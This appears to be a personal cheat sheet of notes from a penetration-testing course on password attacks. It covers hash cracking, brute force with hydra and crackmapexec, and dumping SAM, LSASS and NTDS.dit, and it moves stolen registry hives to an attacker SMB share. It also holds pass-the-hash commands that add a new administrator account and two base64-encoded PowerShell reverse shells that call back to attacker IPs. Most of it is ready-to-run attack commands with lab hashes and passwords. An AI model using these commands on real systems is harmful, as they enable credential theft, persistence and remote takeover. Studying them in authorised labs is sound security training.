# Theory of Protection
hashed pw is stored in `shadow`

### Hashes:
    $1$ 	MD5
    $2a$ 	Blowfish
    $5$ 	SHA-256
    $6$ 	SHA-512
    $sha1$ 	SHA1crypt
    $y$ 	Yescrypt
    $gy$ 	Gost-yescrypt
    $7$ 	Scrypt

### LSASS

Local Security Authority Subsystem Service (LSASS) is a collection of many modules and has access to all authentication processes that can be found in %SystemRoot%\System32\Lsass.exe. This service is responsible for the local system security policy, user authentication, and sending security audit logs to the Event log. In other words, it is the vault for Windows-based operating systems, and we can find a more detailed illustration of the LSASS architecture here.

    Authentication Packages 	Description
    Lsasrv.dll 	The LSA Server service both enforces security policies and acts as the security package manager for the LSA. The LSA contains the Negotiate function, which selects either the NTLM or Kerberos protocol after determining which protocol is to be successful.
    Msv1_0.dll 	Authentication package for local machine logons that don't require custom authentication.
    Samsrv.dll 	The Security Accounts Manager (SAM) stores local security accounts, enforces locally stored policies, and supports APIs.
    Kerberos.dll 	Security package loaded by the LSA for Kerberos-based authentication on a machine.
    Netlogon.dll 	Network-based logon service.
    Ntdsa.dll 	This library is used to create new records and folders in the Windows registry.

windows pw is stored:
`%SystemRoot%/system32/config/SAM`
`%SystemRoot%\ntds.dit`

NTDS is often found on joint windows networkds

    User accounts (username & password hash)
    Group accounts
    Computer accounts
    Group policy objects

```powershell
PS C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\
```

# crack
crack the pw: `john --format=<hash_type> <hash or hash_file>`
    afs 	john --format=afs hashes_to_crack.txt 	AFS (Andrew File System) password hashes
    bfegg 	john --format=bfegg hashes_to_crack.txt 	bfegg hashes used in Eggdrop IRC bots
    bf 	john --format=bf hashes_to_crack.txt 	Blowfish-based crypt(3) hashes
    bsdi 	john --format=bsdi hashes_to_crack.txt 	BSDi crypt(3) hashes
    crypt(3) 	john --format=crypt hashes_to_crack.txt 	Traditional Unix crypt(3) hashes
    des 	john --format=des hashes_to_crack.txt 	Traditional DES-based crypt(3) hashes
    dmd5 	john --format=dmd5 hashes_to_crack.txt 	DMD5 (Dragonfly BSD MD5) password hashes
    dominosec 	john --format=dominosec hashes_to_crack.txt 	IBM Lotus Domino 6/7 password hashes
    EPiServer SID hashes 	john --format=episerver hashes_to_crack.txt 	EPiServer SID (Security Identifier) password hashes
    hdaa 	john --format=hdaa hashes_to_crack.txt 	hdaa password hashes used in Openwall GNU/Linux
    hmac-md5 	john --format=hmac-md5 hashes_to_crack.txt 	hmac-md5 password hashes
    hmailserver 	john --format=hmailserver hashes_to_crack.txt 	hmailserver password hashes
    ipb2 	john --format=ipb2 hashes_to_crack.txt 	Invision Power Board 2 password hashes
    krb4 	john --format=krb4 hashes_to_crack.txt 	Kerberos 4 password hashes
    krb5 	john --format=krb5 hashes_to_crack.txt 	Kerberos 5 password hashes
    LM 	john --format=LM hashes_to_crack.txt 	LM (Lan Manager) password hashes
    lotus5 	john --format=lotus5 hashes_to_crack.txt 	Lotus Notes/Domino 5 password hashes
    mscash 	john --format=mscash hashes_to_crack.txt 	MS Cache password hashes
    mscash2 	john --format=mscash2 hashes_to_crack.txt 	MS Cache v2 password hashes
    mschapv2 	john --format=mschapv2 hashes_to_crack.txt 	MS CHAP v2 password hashes
    mskrb5 	john --format=mskrb5 hashes_to_crack.txt 	MS Kerberos 5 password hashes
    mssql05 	john --format=mssql05 hashes_to_crack.txt 	MS SQL 2005 password hashes
    mssql 	john --format=mssql hashes_to_crack.txt 	MS SQL password hashes
    mysql-fast 	john --format=mysql-fast hashes_to_crack.txt 	MySQL fast password hashes
    mysql 	john --format=mysql hashes_to_crack.txt 	MySQL password hashes
    mysql-sha1 	john --format=mysql-sha1 hashes_to_crack.txt 	MySQL SHA1 password hashes
    NETLM 	john --format=netlm hashes_to_crack.txt 	NETLM (NT LAN Manager) password hashes
    NETLMv2 	john --format=netlmv2 hashes_to_crack.txt 	NETLMv2 (NT LAN Manager version 2) password hashes
    NETNTLM 	john --format=netntlm hashes_to_crack.txt 	NETNTLM (NT LAN Manager) password hashes
    NETNTLMv2 	john --format=netntlmv2 hashes_to_crack.txt 	NETNTLMv2 (NT LAN Manager version 2) password hashes
    NEThalfLM 	john --format=nethalflm hashes_to_crack.txt 	NEThalfLM (NT LAN Manager) password hashes
    md5ns 	john --format=md5ns hashes_to_crack.txt 	md5ns (MD5 namespace) password hashes
    nsldap 	john --format=nsldap hashes_to_crack.txt 	nsldap (OpenLDAP SHA) password hashes
    ssha 	john --format=ssha hashes_to_crack.txt 	ssha (Salted SHA) password hashes
    NT 	john --format=nt hashes_to_crack.txt 	NT (Windows NT) password hashes
    openssha 	john --format=openssha hashes_to_crack.txt 	OPENSSH private key password hashes
    oracle11 	john --format=oracle11 hashes_to_crack.txt 	Oracle 11 password hashes
    oracle 	john --format=oracle hashes_to_crack.txt 	Oracle password hashes
    pdf 	john --format=pdf hashes_to_crack.txt 	PDF (Portable Document Format) password hashes
    phpass-md5 	john --format=phpass-md5 hashes_to_crack.txt 	PHPass-MD5 (Portable PHP password hashing framework) password hashes
    phps 	john --format=phps hashes_to_crack.txt 	PHPS password hashes
    pix-md5 	john --format=pix-md5 hashes_to_crack.txt 	Cisco PIX MD5 password hashes
    po 	john --format=po hashes_to_crack.txt 	Po (Sybase SQL Anywhere) password hashes
    rar 	john --format=rar hashes_to_crack.txt 	RAR (WinRAR) password hashes
    raw-md4 	john --format=raw-md4 hashes_to_crack.txt 	Raw MD4 password hashes
    raw-md5 	john --format=raw-md5 hashes_to_crack.txt 	Raw MD5 password hashes
    raw-md5-unicode 	john --format=raw-md5-unicode hashes_to_crack.txt 	Raw MD5 Unicode password hashes
    raw-sha1 	john --format=raw-sha1 hashes_to_crack.txt 	Raw SHA1 password hashes
    raw-sha224 	john --format=raw-sha224 hashes_to_crack.txt 	Raw SHA224 password hashes
    raw-sha256 	john --format=raw-sha256 hashes_to_crack.txt 	Raw SHA256 password hashes
    raw-sha384 	john --format=raw-sha384 hashes_to_crack.txt 	Raw SHA384 password hashes
    raw-sha512 	john --format=raw-sha512 hashes_to_crack.txt 	Raw SHA512 password hashes
    salted-sha 	john --format=salted-sha hashes_to_crack.txt 	Salted SHA password hashes
    sapb 	john --format=sapb hashes_to_crack.txt 	SAP CODVN B (BCODE) password hashes
    sapg 	john --format=sapg hashes_to_crack.txt 	SAP CODVN G (PASSCODE) password hashes
    sha1-gen 	john --format=sha1-gen hashes_to_crack.txt 	Generic SHA1 password hashes
    skey 	john --format=skey hashes_to_crack.txt 	S/Key (One-time password) hashes
    ssh 	john --format=ssh hashes_to_crack.txt 	SSH (Secure Shell) password hashes
    sybasease 	john --format=sybasease hashes_to_crack.txt 	Sybase ASE password hashes
    xsha 	john --format=xsha hashes_to_crack.txt 	xsha (Extended SHA) password hashes
    zip 	john --format=zip hashes_to_crack.txt 	ZIP (WinZip) password hashes

### Incremental Mode in John
pure brute force

Cracking w. john 
```bash
cry0l1t3@htb:~$ <tool> <file_to_crack> > file.hash
cry0l1t3@htb:~$ pdf2john server_doc.pdf > server_doc.hash
cry0l1t3@htb:~$ john server_doc.hash
                # OR
cry0l1t3@htb:~$ john --wordlist=<wordlist.txt> server_doc.hash 
```
    pdf2john 	Converts PDF documents for John
    ssh2john 	Converts SSH private keys for John
    mscash2john 	Converts MS Cash hashes for John
    keychain2john 	Converts OS X keychain files for John
    rar2john 	Converts RAR archives for John
    pfx2john 	Converts PKCS#12 files for John
    truecrypt_volume2john 	Converts TrueCrypt volumes for John
    keepass2john 	Converts KeePass databases for John
    vncpcap2john 	Converts VNC PCAP files for John
    putty2john 	Converts PuTTY private keys for John
    zip2john 	Converts ZIP archives for John
    hccap2john 	Converts WPA/WPA2 handshake captures for John
    office2john 	Converts MS Office documents for John
    wpa2john 	Converts WPA/WPA2 handshakes for John

or
`locate *2john*`

# Network Services
    FTP 	SMB 	NFS
    IMAP/POP3 	SSH 	MySQL/MSSQL
    RDP 	WinRM 	VNC
    Telnet 	SMTP 	LDAP

### CrackMapExec
`sudo apt-get -y install crackmapexec`

Crackmap usage:
`crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>`
`crackmapexec winrm 10.129.42.197 -u user.list -p password.list`

### Evil-WinRM
`sudo gem install evil-winrm`
`evil-winrm -i <target-IP> -u <username> -p <password>`
`evil-winrm -i 10.129.42.197 -u user -p password`


### For SSH, hydra
`hydra -L user.list -P password.list ssh://10.129.42.197`
`ssh user@10.129.42.197`

### Hydra RDP
`hydra -L user.list -P password.list rdp://10.129.42.197`
Thereafter:
`xfreerdp /v:<target-IP> /u:<username> /p:<password>`

### Hydra SMB
`hydra -L user.list -P password.list smb://10.129.42.197`

### msfconsole
`use auxiliary/scanner/smb/smb_login`

### Crackmap smb
`crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares`

### SMBclient
`smbclient -U user \\\\10.129.42.197\\SHARENAME`

# Password Mutations
We can add a custom rule to a password list to make `hashcat` test a multityde of mutations for each of the passwords
    Function 	Description
    : 	Do nothing.
    l 	Lowercase all letters.
    u 	Uppercase all letters.
    c 	Capitalize the first letter and lowercase others.
    sXY 	Replace all instances of X with Y.
    $! 	Add the exclamation character at the end.

```bash
zirap98@htb[/htb]$ cat custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```
`hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list`

### Hashcat also have existing rules
`ls /usr/share/hashcat/rules/`

We can use [CeWL](https://github.com/digininja/CeWL) to crawl websites for company passwords. 
We can now use another tool called CeWL to scan potential words from the company's website and save them in a separate list. We can then combine this list with the desired rules and create a customized password list that has a higher probability of guessing a correct password. We specify some parameters, like the depth to spider (-d), the minimum length of the word (-m), the storage of the found words in lowercase (--lowercase), as well as the file where we want to store the results (-w).

`cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist`

Check if you can use any other service to brute force. Add more threads to hydra. 

to crack zip pws: `sudo fcrack -u -D -p ./mut_password.list Notes.zip`

# Attacking SAM
SAM is a file that stores users, groups etc on Windows machines. It's used by services like Kerberos authentication or NTLM authentiation.
### Open powershell as administrator on target
```poweshell
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

To transfer files we can use `impacket`
`sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/`

Then move the data:
```powershell
move sam.save \\10.10.15.16\CompData
move security.save \\10.10.15.16\CompData
move system.save \\10.10.15.16\CompData
```

Dumping hashes with `impackets`
`python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`
Though we cannot dump it without boot key


# Dumping LSA Secrets Remotely
`crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa`

`crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam`

# Transfering files:
`sudo impacket-smbserver share -smb2support /tmp/smbshare`
`mv <file to move> \\<ip>\share`
or mount
`net use d: \\<IP>\share (potantially /user:test test)`
in that case:
`sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test`

Would you like to do a proper brute force:
`hashcat -a3 -m1000 nt_hash.txt`

Really good to use crackmapexec:
`crackmapexec smb 10.129.202.137 --local-auth -u Bob -p "HTB_@cademy_stdnt"'!'"" --sam (or lsa)`

# Attacking LSASS
Upon initial logon, LSASS will:

    Cache credentials locally in memory
    Create access tokens
    Enforce security policies
    Write to Windows security log

To do so:
Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file

And it will be created here:
`C:\Users\loggedonusersdirectory\AppData\Local\Temp`

We can also use the command line utility: [rundll32.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32), 

Find `lsass`:
```powershell
C:\Windows\system32> tasklist /svc
PS C:\Windows\system32> Get-Process lsass

# Creating dump
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

### Using Pypykatz to Extract Credentials
 [pypykatz](https://github.com/skelsec/pypykatz)

 ```bash
 pypykatz lsa minidump /home/peter/Documents/lsass.dmp 

 # Looking for MSV

 	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA

	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)

	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	
    == DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
 ```

 Can also break hash wih:
 `sudo hashcat -m 1000 31f87811133bc6aaa75a536e77f64314 /opt/useful/SecLists/Passwords/xato-net-10-million-passwords-1000000.txt -r /opt/useful/htb_resource/custom.rule`

 # Attacking Active Directory & NTDS.dit
 To generate username lists:
 [username-anarchy](https://github.com/urbanadventurer/username-anarchy)
 `./username-anarchy -i /home/ltnbob/names.txt `

Launching the attack:
`crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt`

### Capturing NTDS.dit
Connecting to a DC with Evil-WinRM
`evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'`

### Checking Local Group Membership
```powershell
*Evil-WinRM* PS C:\> net localgroup

# Checking User Account Privileges including Domain
*Evil-WinRM* PS C:\> net user bwilliamson
```

### Creating Shadow Copy of C:
```powershell
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

# Copying NTDS.dit from the VSS
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

# Transfer back to attacker machine
```

# The by far easier way to dump ntds.dit below
We can also dump the `ntds` by:
`crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds`

We can also use `pass-the-hash considerations`, passing the hash instead of clear-text PW. 

`evil-winrm -i 10.129.201.57 -u Administrator -H "64f12cddaa88057e06a81b54e73b949b"`

`evil-winrm -i 10.129.117.239 -u jmarston -p "P@ssword"'!'""`

Script for brute forceing UN and pw:

```bash
#!/bin/bash
namelist="name"

# Define the path to the password file
pw_path="/usr/share/wordlists/fasttrack.txt"

# Read the password file into an array
pw_list=($(< "$pw_path"))

# Loop through each username
for username in $namelist; do
  echo "Trying username: $username"
  
  # Loop through each password
  for password in "${pw_list[@]}"; do
    echo "Trying password: $password"
    
    # Run crackmapexec with the current username and password
    crackmapexec smb 10.129.202.85 -u "$username" -p "$password"
  done
done
```

# Credential Hunting in Windows
common terms:
    Passwords 	Passphrases 	Keys
    Username 	User account 	Creds
    Users 	Passkeys 	Passphrases
    configuration 	dbcredential 	dbpassword
    pwd 	Login 	Credentials

We can use [Lazange](https://github.com/AlessandroZ/LaZagne) for windows, suggestively, keep a kopy of it on the server
```powershell
start lazagne.exe all
```
```bash
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

Here are some other places we should keep in mind when credential hunting:

    Passwords in Group Policy in the SYSVOL share
    Passwords in scripts in the SYSVOL share
    Password in scripts on IT shares
    Passwords in web.config files on dev machines and IT shares
    unattend.xml
    Passwords in the AD user or computer description fields
    KeePass databases --> pull hash, crack and get loads of access.
    Found on user systems and shares
    Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint

# Credential Hunting in Linux
    Files 	History 	Memory 	Key-Rings
    Configs 	Logs 	Cache 	Browser stored credentials
    Databases 	Command-line History 	In-memory Processing 	
    Notes 			
    Scripts 			
    Source codes 			
    Cronjobs 			
    SSH Keys 			

    Configuration files 	Databases 	Notes
    Scripts 	Cronjobs 	SSH keys

Sample for configs:
`for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done`

Sample for credentials:
`for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done`

Databases:
`for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done`

Notes
`find /home/* -type f -name "*.txt" -o ! -name "*.*"`

Scripts
`for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done`

Cronjobs
`cat /etc/crontab `

SSH Private Keys
`grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"`

SSH Public Keys
`grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"`

Bash History
`tail -n5 /home/*/.bash*`

Logs:
    Log File 	Description
    /var/log/messages 	Generic system activity logs.
    /var/log/syslog 	Generic system activity logs.
    /var/log/auth.log 	(Debian) All authentication related logs.
    /var/log/secure 	(RedHat/CentOS) All authentication related logs.
    /var/log/boot.log 	Booting information.
    /var/log/dmesg 	Hardware and drivers related information and logs.
    /var/log/kern.log 	Kernel related warnings, errors and logs.
    /var/log/faillog 	Failed login attempts.
    /var/log/cron 	Information related to cron jobs.
    /var/log/mail.log 	All mail server related logs.
    /var/log/httpd 	All Apache related logs.
    /var/log/mysqld.log 	All MySQL server related logs.

`for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done`

### Memory and cache
We can use mimipenguin
[mimipenguin](https://github.com/huntergregal/mimipenguin)
`sudo python3 mimipenguin.py`
`sudo bash mimipenguin.sh`

Can also use Lazagna:
`sudo python2.7 laZagne.py all`

Firefox
`ls -l .mozilla/firefox/ | grep default `
`cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .`

Decrypting Firefox Credentials
`python3.9 firefox_decrypt.py`

`python3 laZagne.py browsers`


# Passwd, Shadow & Opasswd
Linux-based distributions can use many different authentication mechanisms. One of the most commonly used and standard mechanisms is Pluggable Authentication Modules (PAM). The modules used for this are called `pam_unix.so` or `pam_unix2.so` and are located in `/usr/lib/x86_x64-linux-gnu/security/` in Debian based distributions. These modules manage user information, authentication, sessions, current passwords, and old passwords. For example, if we want to change the password of our account on the Linux system with passwd, PAM is called, which takes the appropriate precautions and stores and handles the information accordingly.


### Hash type in shadow:
    $1$ – MD5
    $2a$ – Blowfish
    $2y$ – Eksblowfish
    $5$ – SHA-256
    $6$ – SHA-512

Editing `/etc/shadow`: `root:x:0:0:root:/root:/bin/bash` --> `root::0:0:root:/root:/bin/bash`
`head -n 1 /etc/passwd`
`su`

### Opasswd

The PAM library (pam_unix.so) can prevent reusing old passwords. The file where old passwords are stored is the /etc/security/opasswd. Administrator/root permissions are also required to read the file if the permissions for this file have not been changed manually.
`sudo cat /etc/security/opasswd`

```bash
sudo cp /etc/passwd /tmp/passwd.bak 
sudo cp /etc/shadow /tmp/shadow.bak 
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
cat md5-hashes.list
hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
```

# Pass the Hash (PtH)
Microsoft's Windows New Technology LAN Manager (NTLM) is a set of security protocols that authenticates users' identities while also protecting the integrity and confidentiality of their data. NTLM is a single sign-on (SSO) solution that uses a challenge-response protocol to verify the user's identity without having them provide a password.

### Mimikatz windows

    /user - The user name we want to impersonate.
    /rc4 or /NTLM - NTLM hash of the user's password.
    /domain - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
    /run - The program we want to run with the user's context (if not specified, it will launch cmd.exe).
```powershell
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
# Pass the Hash with PowerShell Invoke-TheHash (Windows)
When using Invoke-TheHash, we have two options: SMB or WMI command execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:

    Target - Hostname or IP address of the target.
    Username - Username to use for authentication.
    Domain - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
    Hash - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
    Command - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.

```powershell
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

# Reverse shell
.\nc.exe -lvnp 8001
```

To generate reverse shell: [reverse shell generator](https://www.revshells.com/)
Now we can execute Invoke-TheHash to execute our PowerShell reverse shell script in the target computer. Notice that instead of providing the IP address, which is 172.16.1.10, we will use the machine name DC01 (either would work).
```powershell
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

### Pass the hash with different tools Linux
`impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453`
`crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453`
`crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami`
`evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453`

### Pass the Hash with RDP (Linux)
We can perform an RDP PtH attack to gain GUI access to the target system using tools like xfreerdp.

There are a few caveats to this attack:

    Restricted Admin Mode, which is disabled by default, should be enabled on the target host;
This can be enabled by adding a new registry key DisableRestrictedAdmin (REG_DWORD) under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa with the value of 0. It can be done using the following command:

### Enable Restricted Admin Mode to Allow PtH
`c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
[Look tutorial](https://academy.hackthebox.com/module/147/section/1638)

Pass the Hash Using RDP
`xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B`

### UAC Limits Pass the Hash for Local Accounts

UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.

step 1:
dump lsass from control panel
step 2:
dump hashes with mimikatz using:
`sekurlsa::minidump lsass.dmp`
`sekurlsa::logonPasswords`

great tutorial [here](https://null-byte.wonderhowto.com/how-to/hacking-windows-10-dump-ntlm-hashes-crack-windows-passwords-0198268/)

use the hashes to pth wherever
to create the reverse shell:
[reverse shell](https://www.revshells.com/)

then:
```powershell
Import-Module .\Invoke-TheHash.psd1

Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwAOAAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
```

### Remember to use the correct IP address when creating the reverse shell... 

# Pass the Ticket (PtT) from Windows
Different Mimikatz attacks:

Note: At the time of writing, using Mimikatz version 2.2.0 20220919, if we run "sekurlsa::ekeys" it presents all hashes as des_cbc_md4 on some Windows 10 versions. Exported tickets (sekurlsa::tickets /export) do not work correctly due to the wrong encryption. It is possible to use these hashes to generate new tickets or use Rubeus to export tickets in base64 format.

```bash
# Export tickets:
privilege::debug
sekurlsa::tickets /export

dir *.kirbi

# The tickets that end with $ correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an @ that separates the service name and the domain, for example: [randomvalue]-username@service-domain.local.kirbi.

